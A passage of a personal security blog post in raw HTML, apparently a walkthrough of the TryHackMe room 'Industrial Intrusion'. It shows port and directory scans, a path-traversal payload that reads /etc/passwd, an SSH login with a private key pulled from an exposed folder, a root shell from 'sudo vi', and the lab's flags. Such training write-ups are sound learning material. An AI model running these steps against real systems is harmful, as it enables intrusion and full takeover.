</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00022s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Industrial Dev Solutions
</span></span><span class="line"><span class="cl">MAC Address: 02:AA:E7:4C:C1:97 <span class="o">(</span>Unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 10.67 seconds
</span></span><span class="line"><span class="cl">root@ip-10-10-46-202:~# 
</span></span></code></pre></div><p><strong>Findings:</strong></p>
<ul>
<li><strong>Port 22 (SSH)</strong> - OpenSSH 9.6p1</li>
<li><strong>Port 80 (HTTP)</strong> - Apache 2.4.58 (Ubuntu)</li>
</ul>

<h3 class="relative group">Web Enumeration 
    <div id="web-enumeration" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#web-enumeration" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Visited <strong><code>http://10.10.27.251</code></strong> and found a simple website.</p>
<p>Ran <strong><code>gobuster</code></strong> to find hidden directories:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# gobuster dir -u http://10.10.27.251 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.27.251
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.27.251/assets/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/keys                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.27.251/keys/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">218275</span> / <span class="m">218276</span> <span class="o">(</span>100.00%<span class="o">)</span>
</span></span></code></pre></div><p><strong>Key Findings:</strong></p>
<ul>
<li><strong><code>/view.php?page=about.php</code></strong> (LFI vulnerability found)</li>
</ul>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="PossibleLFI.png" src="/images/THM/UnderConstruction/PossibleLFI.png">

  
</figure>
</p>

<h3 class="relative group">Step 2: Exploiting LFI (Local File Inclusion) 
    <div id="step-2-exploiting-lfi-local-file-inclusion" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-exploiting-lfi-local-file-inclusion" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The <strong><code>view.php</code></strong> page had a parameter <strong><code>page</code></strong> vulnerable to LFI. Exploited by this payload: <code>&quot;http://10.10.27.251/view.php?page=../../../../etc/passwd&quot;</code></p>
<ul>
<li>LFI was confirmed - showing available users like Dev:</li>
</ul>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="ConfirmedLFIandUserDEV.png" src="/images/THM/UnderConstruction/ConfirmedLFIandUserDEV.png">

  
</figure>
</p>

<h3 class="relative group">Step 3: Finding SSH Keys(Exploring <code>/keys/</code> Directory) 
    <div id="step-3-finding-ssh-keysexploring-keys-directory" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-finding-ssh-keysexploring-keys-directory" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Found an SSH private key:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="Keys_Directory.png" src="/images/THM/UnderConstruction/Keys_Directory.png">

  
</figure>
</p>
<ul>
<li><strong><code>/keys/</code></strong> (directory containing an SSH private key)</li>
</ul>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="Key09.png" src="/images/THM/UnderConstruction/Key09.png">

  
</figure>
</p>
<p>Saved it as <strong><code>id_rsa</code></strong> and set permissions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# nano id_rsa
</span></span><span class="line"><span class="cl">root@ip-10-10-46-202:~# chmod <span class="m">600</span> id_rsa
</span></span></code></pre></div>
<h3 class="relative group">SSH Access 
    <div id="ssh-access" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ssh-access" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Logged in as <strong><code>dev</code></strong> using the key:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# ssh -i id_rsa dev@10.10.27.251
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.27.251 (10.10.27.251)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:0DorHlp1XSJDyXeM2nQsfJCMv8z0xEZrJB0lIIVFHR0.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.27.251<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 24.04.2 LTS <span class="o">(</span>GNU/Linux 6.8.0-1030-aws x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> System information as of Sun Jun <span class="m">29</span> 10:55:05 UTC <span class="m">2025</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.01               Temperature:           -273.1 C
</span></span><span class="line"><span class="cl">  Usage of /:   16.1% of 19.31GB   Processes:             <span class="m">116</span>
</span></span><span class="line"><span class="cl">  Memory usage: 13%                Users logged in:       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Swap usage:   0%                 IPv4 address <span class="k">for</span> ens5: 10.10.27.251
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Ubuntu Pro delivers the most comprehensive open <span class="nb">source</span> security and
</span></span><span class="line"><span class="cl">   compliance features.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   https://ubuntu.com/aws/pro
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Tue Jun <span class="m">24</span> 16:39:49 <span class="m">2025</span> from 10.13.57.153
</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ ls
</span></span><span class="line"><span class="cl">user.txt
</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ cat user.txt 
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>nic3_j0b_You_got_it_w00tw00t<span class="o">}</span>
</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ 
</span></span></code></pre></div><p><strong>Success!</strong> Got a shell as <strong><code>dev</code></strong> and got the user flag.</p>

<h3 class="relative group">Step 4: Privilege Escalation (Checking Sudo Permissions) 
    <div id="step-4-privilege-escalation-checking-sudo-permissions" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-4-privilege-escalation-checking-sudo-permissions" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Ran <strong><code>sudo -l</code></strong> to see what commands <strong><code>dev</code></strong> could run:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dev@tryhackme-2404:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> dev on tryhackme-2404:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User dev may run the following commands on tryhackme-2404:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/vi
</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ sudo vi -c <span class="s1">&#39;:!/bin/bash&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">^<span class="o">[[</span>Iroot@tryhackme-2404:/home/dev# <span class="nb">cd</span> root
</span></span><span class="line"><span class="cl">bash: cd: root: No such file or directory
</span></span><span class="line"><span class="cl">root@tryhackme-2404:/home/dev# <span class="nb">cd</span> /root
</span></span><span class="line"><span class="cl">root@tryhackme-2404:~# cat root.txt
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>y0u_g0t_it_welldoneeeee<span class="o">}</span>
</span></span><span class="line"><span class="cl">root@tryhackme-2404:~# 
</span></span></code></pre></div>
<h3 class="relative group">Escalating to Root via <code>vi</code> 
    <div id="escalating-to-root-via-vi" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#escalating-to-root-via-vi" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Since <strong><code>vi</code></strong> can execute shell commands, spawned a root shell that got us the root flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo vi -c <span class="s1">&#39;:!/bin/bash&#39;</span>
</span></span></code></pre></div><p><strong>Root Flag:</strong> <strong><code>THM{y0u_g0t_it_welldoneeeee}</code></strong></p>

<h3 class="relative group">Vulnerabilities Exploited 
    <div id="vulnerabilities-exploited" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#vulnerabilities-exploited" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li><strong>LFI in <code>view.php</code></strong> → Allowed reading system files.</li>
<li><strong>Exposed SSH Key</strong> → Gained initial shell access.</li>
<li><strong>Misconfigured Sudo (<code>vi</code> with NOPASSWD)</strong> → Privilege escalation to root.</li>
</ol>
<hr>

          
          
          
        </div>
        
        

        
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://hushkat.github.io/posts/2025-06-30-industrial-intrusion.md/2025-06-30-industrial-intrusion/&amp;title=Tryhackme%20Industrial%20Intrusion"
          title="Share on LinkedIn"
          aria-label="Share on LinkedIn">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://twitter.com/intent/tweet/?url=https://hushkat.github.io/posts/2025-06-30-industrial-intrusion.md/2025-06-30-industrial-intrusion/&amp;text=Tryhackme%20Industrial%20Intrusion"
          title="Tweet on Twitter"
          aria-label="Tweet on Twitter">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://reddit.com/submit/?url=https://hushkat.github.io/posts/2025-06-30-industrial-intrusion.md/2025-06-30-industrial-intrusion/&amp;resubmit=true&amp;title=Tryhackme%20Industrial%20Intrusion"
          title="Submit to Reddit"
          aria-label="Submit to Reddit">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
</span>
        </a>
      
    
      
        <a
          target="_blank"
          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.facebook.com/sharer/sharer.php?u=https://hushkat.github.io/posts/2025-06-30-industrial-intrusion.md/2025-06-30-industrial-intrusion/&amp;quote=Tryhackme%20Industrial%20Intrusion"
          title="Share on Facebook"
          aria-label="Share on Facebook">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span>
        </a>
      
    
  </section>


        

      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
          data-oid="views_posts/2025-06-30-Industrial-Intrusion.md/2025-06-30-Industrial-Intrusion.md"
          data-oid-likes="likes_posts/2025-06-30-Industrial-Intrusion.md/2025-06-30-Industrial-Intrusion.md"></script>
      
    </section>

    
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/2025-06-01-kenyacyberlympics/kenya-cyberlympics-2025/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Kenya Cyberlympics 2025</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-06-01T01:09:33&#43;03:00">1 June 2025</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/2025-07-02-cloudgoat.md/2025-07-02-cloudgoat/">
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >The Silent Threat in Your AWS Environment: IAM Privilege Escalation via Policy Rollback</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-06-30T01:09:33&#43;03:00">30 June 2025</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
  <a
    href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          © 2025 HushKat. All rights reserved.
      </p>
    

    
    
      <p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
      </p>
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
  <script
    type="text/javascript"
    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
    <a rel="me" href="https://masto.ai/@blowfish"></a>

  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="https://hushkat.github.io/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
